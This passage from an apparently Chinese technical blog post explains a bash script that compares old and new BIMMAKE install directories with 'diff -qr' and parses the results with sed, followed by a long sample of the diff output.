&lt;span&gt; 2&lt;/span&gt;     &lt;span&gt;diff&lt;/span&gt; -qr &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$srcdir&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$dstdir&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; -X &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$patdiff&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; &amp;gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$dirdiff&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt; 3&lt;/span&gt; &lt;span&gt;else&lt;/span&gt;
&lt;span&gt; 4&lt;/span&gt;     &lt;span&gt;diff&lt;/span&gt; -qr &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$srcdir&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$dstdir&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; &amp;gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$dirdiff&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt; 5&lt;/span&gt; &lt;span&gt;fi&lt;/span&gt; 
&lt;span&gt; 6&lt;/span&gt; 
&lt;span&gt; 7&lt;/span&gt; &lt;span&gt;while&lt;/span&gt;&lt;span&gt; read line
&lt;/span&gt;&lt;span&gt; 8&lt;/span&gt; &lt;span&gt;do&lt;/span&gt;
&lt;span&gt; 9&lt;/span&gt;     &lt;span&gt;if&lt;/span&gt; [ $verbose != &lt;span&gt;0&lt;/span&gt; ]; &lt;span&gt;then&lt;/span&gt; 
&lt;span&gt;10&lt;/span&gt;         &lt;span&gt;echo&lt;/span&gt;&lt;span&gt; $line
&lt;/span&gt;&lt;span&gt;11&lt;/span&gt;     &lt;span&gt;fi&lt;/span&gt; 
&lt;span&gt;12&lt;/span&gt; 
&lt;span&gt;13&lt;/span&gt;     tmp=$(&lt;span&gt;echo&lt;/span&gt; $line | &lt;span&gt;sed&lt;/span&gt; -n &lt;span&gt;'&lt;/span&gt;&lt;span&gt;s/Files \(.*\) and \(.*\) differ$/\1\\n\2/p&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;14&lt;/span&gt;     &lt;span&gt;if&lt;/span&gt; [ ! -z &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$tmp&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; ]; &lt;span&gt;then&lt;/span&gt; 
&lt;span&gt;15&lt;/span&gt;         left=$(&lt;span&gt;echo&lt;/span&gt; -e $tmp | &lt;span&gt;sed&lt;/span&gt; -&lt;span&gt;n 1p)
&lt;/span&gt;&lt;span&gt;16&lt;/span&gt;         right=$(&lt;span&gt;echo&lt;/span&gt; -e $tmp | &lt;span&gt;sed&lt;/span&gt; -&lt;span&gt;n 2p)
&lt;/span&gt;&lt;span&gt;17&lt;/span&gt;         &lt;span&gt;if&lt;/span&gt; [ $verbose != &lt;span&gt;0&lt;/span&gt; ]; &lt;span&gt;then&lt;/span&gt; 
&lt;span&gt;18&lt;/span&gt;             &lt;span&gt;echo&lt;/span&gt; -e &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;left =$left, \nright=$right&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt;19&lt;/span&gt;         &lt;span&gt;fi&lt;/span&gt; 
&lt;span&gt;20&lt;/span&gt; &lt;span&gt;        ……
&lt;/span&gt;&lt;span&gt;21&lt;/span&gt;     &lt;span&gt;else&lt;/span&gt; 
&lt;span&gt;22&lt;/span&gt;         tmp=$(&lt;span&gt;echo&lt;/span&gt; $line | &lt;span&gt;sed&lt;/span&gt; -n &lt;span&gt;'&lt;/span&gt;&lt;span&gt;s/Only in \(.*\): \(.*\)/\1\\n\2/p&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;23&lt;/span&gt;         &lt;span&gt;if&lt;/span&gt; [ ! -z &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$tmp&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; ]; &lt;span&gt;then&lt;/span&gt; 
&lt;span&gt;24&lt;/span&gt;             isdir=&lt;span&gt;0&lt;/span&gt;
&lt;span&gt;25&lt;/span&gt;             &lt;span&gt;dir&lt;/span&gt;=$(&lt;span&gt;echo&lt;/span&gt; -e $tmp | &lt;span&gt;sed&lt;/span&gt; -&lt;span&gt;n 1p)
&lt;/span&gt;&lt;span&gt;26&lt;/span&gt;             &lt;span&gt;file&lt;/span&gt;=$(&lt;span&gt;echo&lt;/span&gt; -e $tmp | &lt;span&gt;sed&lt;/span&gt; -&lt;span&gt;n 2p)
&lt;/span&gt;&lt;span&gt;27&lt;/span&gt;             &lt;span&gt;if&lt;/span&gt; [ -d &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$dir/$file&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; ]; &lt;span&gt;then&lt;/span&gt; 
&lt;span&gt;28&lt;/span&gt;                 isdir=&lt;span&gt;1&lt;/span&gt;
&lt;span&gt;29&lt;/span&gt;             &lt;span&gt;fi&lt;/span&gt; 
&lt;span&gt;30&lt;/span&gt; 
&lt;span&gt;31&lt;/span&gt;             &lt;span&gt;if&lt;/span&gt; [ $verbose != &lt;span&gt;0&lt;/span&gt; ]; &lt;span&gt;then&lt;/span&gt; 
&lt;span&gt;32&lt;/span&gt;                 &lt;span&gt;echo&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;dir=$dir, file=$file, isdir=$isdir&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt;33&lt;/span&gt;             &lt;span&gt;fi&lt;/span&gt;
&lt;span&gt;34&lt;/span&gt; &lt;span&gt;            ……
&lt;/span&gt;&lt;span&gt;35&lt;/span&gt;         &lt;span&gt;else&lt;/span&gt; 
&lt;span&gt;36&lt;/span&gt;             &lt;span&gt;echo&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;unrecognized diff output: $line&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt;37&lt;/span&gt;         &lt;span&gt;fi&lt;/span&gt; 
&lt;span&gt;38&lt;/span&gt;     &lt;span&gt;fi&lt;/span&gt;
&lt;span&gt;39&lt;/span&gt;     &lt;span&gt;echo&lt;/span&gt; &lt;span&gt;&quot;&quot;&lt;/span&gt;
&lt;span&gt;40&lt;/span&gt; &lt;span&gt;done&lt;/span&gt; &amp;lt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$dirdiff&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;这段代码省略了一些与对比目录无关的内容，便于看清整个大的流程：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;1-5：根据是否有忽略模式文件来调用 diff，当存在这种文件时（上文中的 139-149），增加 -X 选项来添加忽略模式文件到对比目录过程(diff)；否则使用简单输出模式(-q)递归(-r)对比目录及其子目录，输出内容保存在 dir.diff 文件中；&lt;/li&gt;
&lt;li&gt;7,8,40：遍历 dir.diff 文件内容，根据输出格式的不同，细分为以下几类场景：
&lt;ul&gt;&lt;li&gt;两侧都有但文件内容不一致：“&lt;span&gt;&lt;span&gt;Files&lt;/span&gt; C:/compare/BIMMAKE.old/BmIGMS/TypeRule4Bimface.json &lt;span&gt;&lt;span&gt;and&lt;/span&gt; C:/compare/BIMMAKE/BmIGMS/TypeRule4Bimface.json &lt;span&gt;&lt;span&gt;differ&lt;/span&gt;”，通过 sed 匹配例子中高亮部分关键字，就可以分别提取出旧文件与新文件的完整路径（分别为 sed 输出的第一二行，line 13-16）；&lt;br/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;仅有旧目录有的内容：“&lt;span&gt;Only in&lt;/span&gt; C:/compare/BIMMAKE.old/sdk&lt;span&gt;:&lt;/span&gt; ViewerConfig.ini”；&lt;/li&gt;
&lt;li&gt;仅有新目录有的内容：“&lt;span&gt;Only in&lt;/span&gt; C:/compare/BIMMAKE/sdk&lt;span&gt;:&lt;/span&gt; Mesh.dll”， 以上两种场景相似，通过 sed 匹配例子中高亮部分关键字，就可以分别提取出目录与文件了（line 22-26），至于是新目录还是旧目录，与新旧根目录做个对比就晓得了，这个后面再说；&lt;/li&gt;
&lt;li&gt;两边文件一致：不会有任何输出（这里必需为 diff 命令使用 -q 选项，不然会将文件内容差异也展示出来，那就非常乱了）。下面是一段完整的对比输出（内容超长、展开慎重）：&lt;br/&gt;&lt;div readability=&quot;7.5&quot;&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;35&quot;&gt;
&lt;pre class=&quot;brush:bash;collapse:true;;gutter:false;&quot;&gt;
Files C:/compare/BIMMAKE.old/AppBimmake.exe and C:/compare/BIMMAKE/AppBimmake.exe differ
Files C:/compare/BIMMAKE.old/AppBimmakeImpl.dll and C:/compare/BIMMAKE/AppBimmakeImpl.dll differ
Files C:/compare/BIMMAKE.old/AppComponentEditor.exe and C:/compare/BIMMAKE/AppComponentEditor.exe differ
Files C:/compare/BIMMAKE.old/AppComponentEditorImpl.dll and C:/compare/BIMMAKE/AppComponentEditorImpl.dll differ
Only in C:/compare/BIMMAKE: AppSocketPortConfig.exe
Only in C:/compare/BIMMAKE: AppSocketPortConfigImpl.dll
Files C:/compare/BIMMAKE.old/BIMMAKE/Templates/bmDefaultTemplate.gbp and C:/compare/BIMMAKE/BIMMAKE/Templates/bmDefaultTemplate.gbp differ
Files C:/compare/BIMMAKE.old/BmAnimation.dll and C:/compare/BIMMAKE/BmAnimation.dll differ
Files C:/compare/BIMMAKE.old/BmAnimationScript.dll and C:/compare/BIMMAKE/BmAnimationScript.dll differ
Only in C:/compare/BIMMAKE: BmAppSetting.xml
Files C:/compare/BIMMAKE.old/BmCommonDraw.dll and C:/compare/BIMMAKE/BmCommonDraw.dll differ
Files C:/compare/BIMMAKE.old/BmCommonEdit.dll and C:/compare/BIMMAKE/BmCommonEdit.dll differ
Files C:/compare/BIMMAKE.old/BmDataExchange.dll and C:/compare/BIMMAKE/BmDataExchange.dll differ
Files C:/compare/BIMMAKE.old/BmDrawingExport.dll and C:/compare/BIMMAKE/BmDrawingExport.dll differ
Files C:/compare/BIMMAKE.old/BmFalcon.dll and C:/compare/BIMMAKE/BmFalcon.dll differ
Files C:/compare/BIMMAKE.old/BmFamilyBridge.dll and C:/compare/BIMMAKE/BmFamilyBridge.dll differ
Files C:/compare/BIMMAKE.old/BmGbmpModel.dll and C:/compare/BIMMAKE/BmGbmpModel.dll differ
Files C:/compare/BIMMAKE.old/BmGbmpUiPlatform.dll and C:/compare/BIMMAKE/BmGbmpUiPlatform.dll differ
Files C:/compare/BIMMAKE.old/BmGgpUtility.dll and C:/compare/BIMMAKE/BmGgpUtility.dll differ
Files C:/compare/BIMMAKE.old/BmGuxActionConfig.json and C:/compare/BIMMAKE/BmGuxActionConfig.json differ
Files C:/compare/BIMMAKE.old/BmHotKeyConfig.xml and C:/compare/BIMMAKE/BmHotKeyConfig.xml differ
Files C:/compare/BIMMAKE.old/BmIGMS/TypeRule.json and C:/compare/BIMMAKE/BmIGMS/TypeRule.json differ
Files C:/compare/BIMMAKE.old/BmIGMS/TypeRule4Bimface.json and C:/compare/BIMMAKE/BmIGMS/TypeRule4Bimface.json differ
Files C:/compare/BIMMAKE.old/BmIGMSExport.dll and C:/compare/BIMMAKE/BmIGMSExport.dll differ
Files C:/compare/BIMMAKE.old/BmImportGfc.dll and C:/compare/BIMMAKE/BmImportGfc.dll differ
Files C:/compare/BIMMAKE.old/BmImportIfc.dll and C:/compare/BIMMAKE/BmImportIfc.dll differ
Files C:/compare/BIMMAKE.old/BmInterOpRevitProject.dll and C:/compare/BIMMAKE/BmInterOpRevitProject.dll differ
Files C:/compare/BIMMAKE.old/BmInteraction.dll and C:/compare/BIMMAKE/BmInteraction.dll differ
Files C:/compare/BIMMAKE.old/BmLicense.dll and C:/compare/BIMMAKE/BmLicense.dll differ
Files C:/compare/BIMMAKE.old/BmModel.dll and C:/compare/BIMMAKE/BmModel.dll differ
Files C:/compare/BIMMAKE.old/BmMultiThreadNetwork.dll and C:/compare/BIMMAKE/BmMultiThreadNetwork.dll differ
Files C:/compare/BIMMAKE.old/BmPositioningElements.dll and C:/compare/BIMMAKE/BmPositioningElements.dll differ
Files C:/compare/BIMMAKE.old/BmRebar.dll and C:/compare/BIMMAKE/BmRebar.dll differ
Only in C:/compare/BIMMAKE.old: BmRecentDocumentPathRecord.xml
Files C:/compare/BIMMAKE.old/BmSiteLayout.dll and C:/compare/BIMMAKE/BmSiteLayout.dll differ
Files C:/compare/BIMMAKE.old/BmSiteLayoutFamily.dll and C:/compare/BIMMAKE/BmSiteLayoutFamily.dll differ
Files C:/compare/BIMMAKE.old/BmSiteLayoutUi.dll and C:/compare/BIMMAKE/BmSiteLayoutUi.dll differ
Files C:/compare/BIMMAKE.old/BmStructure.dll and C:/compare/BIMMAKE/BmStructure.dll differ
Files C:/compare/BIMMAKE.old/BmStructureFamily.dll and C:/compare/BIMMAKE/BmStructureFamily.dll differ
Files C:/compare/BIMMAKE.old/BmSurfaceSystem.dll and C:/compare/BIMMAKE/BmSurfaceSystem.dll differ
Files C:/compare/BIMMAKE.old/BmTeighaUtility.dll and C:/compare/BIMMAKE/BmTeighaUtility.dll differ
Files C:/compare/BIMMAKE.old/BmTest.dll and C:/compare/BIMMAKE/BmTest.dll differ
Files C:/compare/BIMMAKE.old/BmThirdPartyUpdate.dll and C:/compare/BIMMAKE/BmThirdPartyUpdate.dll differ
Files C:/compare/BIMMAKE.old/BmUiAnimation.dll and C:/compare/BIMMAKE/BmUiAnimation.dll differ
Files C:/compare/BIMMAKE.old/BmUiAnimationWidget.dll and C:/compare/BIMMAKE/BmUiAnimationWidget.dll differ
Files C:/compare/BIMMAKE.old/BmUiCommonComponent.dll and C:/compare/BIMMAKE/BmUiCommonComponent.dll differ
Files C:/compare/BIMMAKE.old/BmUiDataExchange.dll and C:/compare/BIMMAKE/BmUiDataExchange.dll differ
Files C:/compare/BIMMAKE.old/BmUiInplaceEdit.dll and C:/compare/BIMMAKE/BmUiInplaceEdit.dll differ
Files C:/compare/BIMMAKE.old/BmUiPlatform.dll and C:/compare/BIMMAKE/BmUiPlatform.dll differ
Files C:/compare/BIMMAKE.old/BmUiReBar.dll and C:/compare/BIMMAKE/BmUiReBar.dll differ
Files C:/compare/BIMMAKE.old/BmUiStructure.dll and C:/compare/BIMMAKE/BmUiStructure.dll differ
Files C:/compare/BIMMAKE.old/BmUiVisual.dll and C:/compare/BIMMAKE/BmUiVisual.dll differ
Files C:/compare/BIMMAKE.old/BmVisualModel.dll and C:/compare/BIMMAKE/BmVisualModel.dll differ
Files C:/compare/BIMMAKE.old/BmWelcomeTemplateFile/MjTemplateFile.xml and C:/compare/BIMMAKE/BmWelcomeTemplateFile/MjTemplateFile.xml differ
Files C:/compare/BIMMAKE.old/BmWelcomeTemplateFile/二次结构砌体.gbp and C:/compare/BIMMAKE/BmWelcomeTemplateFile/二次结构砌体.gbp differ
Files C:/compare/BIMMAKE.old/BmWelcomeTemplateFile/二次结构砌体.png and C:/compare/BIMMAKE/BmWelcomeTemplateFile/二次结构砌体.png differ
Only in C:/compare/BIMMAKE.old/BmWelcomeTemplateFile: 小别墅.gbp
Only in C:/compare/BIMMAKE.old/BmWelcomeTemplateFile: 小别墅.png
Files C:/compare/BIMMAKE.old/BmWelcomeTemplateFile/施工场地布置.gbp and C:/compare/BIMMAKE/BmWelcomeTemplateFile/施工场地布置.gbp differ
Files C:/compare/BIMMAKE.old/BmWelcomeTemplateFile/施工场地布置.png and C:/compare/BIMMAKE/BmWelcomeTemplateFile/施工场地布置.png differ
Only in C:/compare/BIMMAKE/BmWelcomeTemplateFile: 木模板配模.gbp
Only in C:/compare/BIMMAKE/BmWelcomeTemplateFile: 木模板配模.png
Only in C:/compare/BIMMAKE.old/BmWelcomeTemplateFile: 老虎窗屋顶.gbp
Only in C:/compare/BIMMAKE.old/BmWelcomeTemplateFile: 老虎窗屋顶.png
Only in C:/compare/BIMMAKE/BmWelcomeTemplateFile: 钢筋节点深化.gbp
Only in C:/compare/BIMMAKE/BmWelcomeTemplateFile: 钢筋节点深化.png
Files C:/compare/BIMMAKE.old/CadIdentifier/ArchiAlgo.dll and C:/compare/BIMMAKE/CadIdentifier/ArchiAlgo.dll differ
Files C:/compare/BIMMAKE.old/CadIdentifier/BarInfo.GDB and C:/compare/BIMMAKE/CadIdentifier/BarInfo.GDB differ
Files C:/compare/BIMMAKE.old/CadIdentifier/BarInfo.GDB.back and C:/compare/BIMMAKE/CadIdentifier/BarInfo.GDB.back differ
Files C:/compare/BIMMAKE.old/CadIdentifier/CadIdentifier2018.exe and C:/compare/BIMMAKE/CadIdentifier/CadIdentifier2018.exe differ
Files C:/compare/BIMMAKE.old/CadIdentifier/CmdCore.dll and C:/compare/BIMMAKE/CadIdentifier/CmdCore.dll differ
Files C:/compare/BIMMAKE.old/CadIdentifier/Common.dll and C:/compare/BIMMAKE/CadIdentifier/Common.dll differ
Only in C:/compare/BIMMAKE.old/CadIdentifier: DBErrorReport.txt
Files C:/compare/BIMMAKE.old/CadIdentifier/DBOperations.dll and C:/compare/BIMMAKE/CadIdentifier/DBOperations.dll differ
Only in C:/compare/BIMMAKE/CadIdentifier: Fonts
Files C:/compare/BIMMAKE.old/CadIdentifier/GCADIdentification.dll and C:/compare/BIMMAKE/CadIdentifier/GCADIdentification.dll differ
Files C:/compare/BIMMAKE.old/CadIdentifier/GCADModel.dll and C:/compare/BIMMAKE/CadIdentifier/GCADModel.dll differ
Files C:/compare/BIMMAKE.old/CadIdentifier/GCLDataService.dll and C:/compare/BIMMAKE/CadIdentifier/GCLDataService.dll differ
Files C:/compare/BIMMAKE.old/CadIdentifier/GCLProjectDataHelper.dll and C:/compare/BIMMAKE/CadIdentifier/GCLProjectDataHelper.dll differ
Files C:/compare/BIMMAKE.old/CadIdentifier/GCPPMProjDataHelper.dll and C:/compare/BIMMAKE/CadIdentifier/GCPPMProjDataHelper.dll differ
Files C:/compare/BIMMAKE.old/CadIdentifier/GEPEngine.dll and C:/compare/BIMMAKE/CadIdentifier/GEPEngine.dll differ
Files C:/compare/BIMMAKE.old/CadIdentifier/GFCCommon.dll and C:/compare/BIMMAKE/CadIdentifier/GFCCommon.dll differ
Files C:/compare/BIMMAKE.old/CadIdentifier/GGDB.dll and C:/compare/BIMMAKE/CadIdentifier/GGDB.dll differ
Files C:/compare/BIMMAKE.old/CadIdentifier/GGDBDataAwareCtrl.dll and C:/compare/BIMMAKE/CadIdentifier/GGDBDataAwareCtrl.dll differ
Files C:/compare/BIMMAKE.old/CadIdentifier/GGJProjectDataHelper.dll and C:/compare/BIMMAKE/CadIdentifier/GGJProjectDataHelper.dll differ
Files C:/compare/BIMMAKE.old/CadIdentifier/GGJSectionBarEditor.dll and C:/compare/BIMMAKE/CadIdentifier/GGJSectionBarEditor.dll differ
Files C:/compare/BIMMAKE.old/CadIdentifier/GGPViewerProxy.dll and C:/compare/BIMMAKE/CadIdentifier/GGPViewerProxy.dll differ
Files C:/compare/BIMMAKE.old/CadIdentifier/GLDCommon.dll and C:/compare/BIMMAKE/CadIdentifier/GLDCommon.dll differ
Files C:/compare/BIMMAKE.old/CadIdentifier/GLDCrypt.dll and C:/compare/BIMMAKE/CadIdentifier/GLDCrypt.dll differ
Files C:/compare/BIMMAKE.old/CadIdentifier/GLDPrivateCalledPlatform.dll and C:/compare/BIMMAKE/CadIdentifier/GLDPrivateCalledPlatform.dll differ
Files C:/compare/BIMMAKE.old/CadIdentifier/GLDStyles.dll and C:/compare/BIMMAKE/CadIdentifier/GLDStyles.dll differ
Files C:/compare/BIMMAKE.old/CadIdentifier/GLDTableView.dll and C:/compare/BIMMAKE/CadIdentifier/GLDTableView.dll differ
Files C:/compare/BIMMAKE.old/CadIdentifier/GLDThemeEngine.dll and C:/compare/BIMMAKE/CadIdentifier/GLDThemeEngine.dll differ
Files C:/compare/BIMMAKE.old/CadIdentifier/GLDWidget.dll and C:/compare/BIMMAKE/CadIdentifier/GLDWidget.dll differ
Files C:/compare/BIMMAKE.old/CadIdentifier/GLDXML.dll and C:/compare/BIMMAKE/CadIdentifier/GLDXML.dll differ
Files C:/compare/BIMMAKE.old/CadIdentifier/GLDZip.dll and C:/compare/BIMMAKE/CadIdentifier/GLDZip.dll differ
Files C:/compare/BIMMAKE.old/CadIdentifier/GMCommon.dll and C:/compare/BIMMAKE/CadIdentifier/GMCommon.dll differ
Files C:/compare/BIMMAKE.old/CadIdentifier/GMJ.dll and C:/compare/BIMMAKE/CadIdentifier/GMJ.dll differ
Files C:/compare/BIMMAKE.old/CadIdentifier/GMModel.dll and C:/compare/BIMMAKE/CadIdentifier/GMModel.dll differ
Files C:/compare/BIMMAKE.old/CadIdentifier/GMPControls.dll and C:/compare/BIMMAKE/CadIdentifier/GMPControls.dll differ
Files C:/compare/BIMMAKE.old/CadIdentifier/GMPCore.dll and C:/compare/BIMMAKE/CadIdentifier/GMPCore.dll differ
Files C:/compare/BIMMAKE.old/CadIdentifier/GMPRibbonStyle.dll and C:/compare/BIMMAKE/CadIdentifier/GMPRibbonStyle.dll differ
Files C:/compare/BIMMAKE.old/CadIdentifier/GMPUIExtends.dll and C:/compare/BIMMAKE/CadIdentifier/GMPUIExtends.dll differ
Files C:/compare/BIMMAKE.old/CadIdentifier/GMath.dll and C:/compare/BIMMAKE/CadIdentifier/GMath.dll differ
Files C:/compare/BIMMAKE.old/CadIdentifier/GP.dll and C:/compare/BIMMAKE/CadIdentifier/GP.dll differ
Files C:/compare/BIMMAKE.old/CadIdentifier/GRPCommon.dll and C:/compare/BIMMAKE/CadIdentifier/GRPCommon.dll differ
Files C:/compare/BIMMAKE.old/CadIdentifier/GRPEngine.dll and C:/compare/BIMMAKE/CadIdentifier/GRPEngine.dll differ
Files C:/compare/BIMMAKE.old/CadIdentifier/GSP.dll and C:/compare/BIMMAKE/CadIdentifier/GSP.dll differ
Files C:/compare/BIMMAKE.old/CadIdentifier/GSPEngine.dll and C:/compare/BIMMAKE/CadIdentifier/GSPEngine.dll differ
Files C:/compare/BIMMAKE.old/CadIdentifier/GTCADImporter.dll and C:/compare/BIMMAKE/CadIdentifier/GTCADImporter.dll differ
Files C:/compare/BIMMAKE.old/CadIdentifier/GTJBodyBuilder.dll and C:/compare/BIMMAKE/CadIdentifier/GTJBodyBuilder.dll differ
Files C:/compare/BIMMAKE.old/CadIdentifier/GTJCADBeamIdentifier.dll and C:/compare/BIMMAKE/CadIdentifier/GTJCADBeamIdentifier.dll differ
Files C:/compare/BIMMAKE.old/CadIdentifier/GTJCADCmdState.dll and C:/compare/BIMMAKE/CadIdentifier/GTJCADCmdState.dll differ
Files C:/compare/BIMMAKE.old/CadIdentifier/GTJCADColumnDetailIdentifier.dll and C:/compare/BIMMAKE/CadIdentifier/GTJCADColumnDetailIdentifier.dll differ
Files C:/compare/BIMMAKE.old/CadIdentifier/GTJCADCommonAlgorithm.dll and C:/compare/BIMMAKE/CadIdentifier/GTJCADCommonAlgorithm.dll differ
Files C:/compare/BIMMAKE.old/CadIdentifier/GTJCADIdentifier.dll and C:/compare/BIMMAKE/CadIdentifier/GTJCADIdentifier.dll differ
Files C:/compare/BIMMAKE.old/CadIdentifier/GTJCADPlugin.dll and C:/compare/BIMMAKE/CadIdentifier/GTJCADPlugin.dll differ
Files C:/compare/BIMMAKE.old/CadIdentifier/GTJCalcDomainModel.dll and C:/compare/BIMMAKE/CadIdentifier/GTJCalcDomainModel.dll differ
Files C:/compare/BIMMAKE.old/CadIdentifier/GTJCalcExtension.dll and C:/compare/BIMMAKE/CadIdentifier/GTJCalcExtension.dll differ
Files C:/compare/BIMMAKE.old/CadIdentifier/GTJDomainModel.dll and C:/compare/BIMMAKE/CadIdentifier/GTJDomainModel.dll differ
Files C:/compare/BIMMAKE.old/CadIdentifier/GTJGeneralAlgorithm.dll and C:/compare/BIMMAKE/CadIdentifier/GTJGeneralAlgorithm.dll differ
Files C:/compare/BIMMAKE.old/CadIdentifier/GTJGeneralUtility.dll and C:/compare/BIMMAKE/CadIdentifier/GTJGeneralUtility.dll differ
Files C:/compare/BIMMAKE.old/CadIdentifier/GTJModelCmdState.dll and C:/compare/BIMMAKE/CadIdentifier/GTJModelCmdState.dll differ
Files C:/compare/BIMMAKE.old/CadIdentifier/GTJModelDAO.dll and C:/compare/BIMMAKE/CadIdentifier/GTJModelDAO.dll differ
Files C:/compare/BIMMAKE.old/CadIdentifier/GTJModelExtension.dll and C:/compare/BIMMAKE/CadIdentifier/GTJModelExtension.dll differ
Files C:/compare/BIMMAKE.old/CadIdentifier/GTJModelPlugin.dll and C:/compare/BIMMAKE/CadIdentifier/GTJModelPlugin.dll differ
Files C:/compare/BIMMAKE.old/CadIdentifier/GTJProjectDataHelper.dll and C:/compare/BIMMAKE/CadIdentifier/GTJProjectDataHelper.dll differ
Files C:/compare/BIMMAKE.old/CadIdentifier/GTJUIModule.dll and C:/compare/BIMMAKE/CadIdentifier/GTJUIModule.dll differ
Files C:/compare/BIMMAKE.old/CadIdentifier/GTTchEntity_4.00_10.tx and C:/compare/BIMMAKE/CadIdentifier/GTTchEntity_4.00_10.tx differ
Files C:/compare/BIMMAKE.old/CadIdentifier/GUC.dll and C:/compare/BIMMAKE/CadIdentifier/GUC.dll differ
Files C:/compare/BIMMAKE.old/CadIdentifier/Geometry.dll and C:/compare/BIMMAKE/CadIdentifier/Geometry.dll differ
Files C:/compare/BIMMAKE.old/CadIdentifier/GfcClasses.dll and C:/compare/BIMMAKE/CadIdentifier/GfcClasses.dll differ
Files C:/compare/BIMMAKE.old/CadIdentifier/Layout and C:/compare/BIMMAKE/CadIdentifier/Layout differ
Files C:/compare/BIMMAKE.old/CadIdentifier/MDCache.dll and C:/compare/BIMMAKE/CadIdentifier/MDCache.dll differ
Files C:/compare/BIMMAKE.old/CadIdentifier/MDCmdLog.dll and C:/compare/BIMMAKE/CadIdentifier/MDCmdLog.dll differ
Files C:/compare/BIMMAKE.old/CadIdentifier/MDCommon.dll and C:/compare/BIMMAKE/CadIdentifier/MDCommon.dll differ
Files C:/compare/BIMMAKE.old/CadIdentifier/MDScript.dll and C:/compare/BIMMAKE/CadIdentifier/MDScript.dll differ
Files C:/compare/BIMMAKE.old/CadIdentifier/MaterialCore.dll and C:/compare/BIMMAKE/CadIdentifier/MaterialCore.dll differ
Only in C:/compare/BIMMAKE/CadIdentifier: Microsoft.DTfW.DHL.manifest
Files C:/compare/BIMMAKE.old/CadIdentifier/RenderSystemAngle.dll and C:/compare/BIMMAKE/CadIdentifier/RenderSystemAngle.dll differ
Files C:/compare/BIMMAKE.old/CadIdentifier/RenderSystemGL.dll and C:/compare/BIMMAKE/CadIdentifier/RenderSystemGL.dll differ
Files C:/compare/BIMMAKE.old/CadIdentifier/Ubc.dll and C:/compare/BIMMAKE/CadIdentifier/Ubc.dll differ
Files C:/compare/BIMMAKE.old/CadIdentifier/UserInfo.GDB and C:/compare/BIMMAKE/CadIdentifier/UserInfo.GDB differ
Files C:/compare/BIMMAKE.old/CadIdentifier/UserInfo.GDB.ggdblog.dat and C:/compare/BIMMAKE/CadIdentifier/UserInfo.GDB.ggdblog.dat differ
Files C:/compare/BIMMAKE.old/CadIdentifier/VDECore.dll and C:/compare/BIMMAKE/CadIdentifier/VDECore.dll differ
Files C:/compare/BIMMAKE.old/CadIdentifier/VectorDrawing.dll and C:/compare/BIMMAKE/CadIdentifier/VectorDrawing.dll differ
Files C:/compare/BIMMAKE.old/CadIdentifier/ViewCore.dll and C:/compare/BIMMAKE/CadIdentifier/ViewCore.dll differ
Files C:/compare/BIMMAKE.old/CadIdentifier/ViewManager.dll and C:/compare/BIMMAKE/CadIdentifier/ViewManager.dll differ
Only in C:/compare/BIMMAKE/CadIdentifier: filedialog.ini
Files C:/compare/BIMMAKE.old/CadIdentifier/gsolver.dll and C:/compare/BIMMAKE/CadIdentifier/gsolver.dll differ
Files C:/compare/BIMMAKE.old/CadIdentifier/skin/CoolDark.rcc and C:/compare/BIMMAKE/CadIdentifier/skin/CoolDark.rcc differ
Files C:/compare/BIMMAKE.old/CadIdentifier/skin/SilveryWhite.rcc and C:/compare/BIMMAKE/CadIdentifier/skin/SilveryWhite.rcc differ
Only in C:/compare/BIMMAKE/ComponentEditor/Templates/GFCFamily: 倒棱台独立基础.gac
Only in C:/compare/BIMMAKE/ComponentEditor/Templates/GFCFamily: 偏心二阶独立基础.gac
Only in C:/compare/BIMMAKE/ComponentEditor/Templates/GFCFamily: 双台双杯口独立基础.gac
Only in C:/compare/BIMMAKE/ComponentEditor/Templates/GFCFamily: 四棱锥台形独立基础.gac
Only in C:/compare/BIMMAKE/ComponentEditor/Templates/GFCFamily: 四棱锥台形独立基础带柱.gac
Only in C:/compare/BIMMAKE/ComponentEditor/Templates/GFCFamily: 带短柱杯口独立基础.gac
Only in C:/compare/BIMMAKE/ComponentEditor/Templates/GFCFamily: 底偏心矩形独立基础.gac
Only in C:/compare/BIMMAKE/ComponentEditor/Templates/GFCFamily: 杯形基础.gac
Only in C:/compare/BIMMAKE/ComponentEditor/Templates/GFCFamily: 独立基础三台.gac
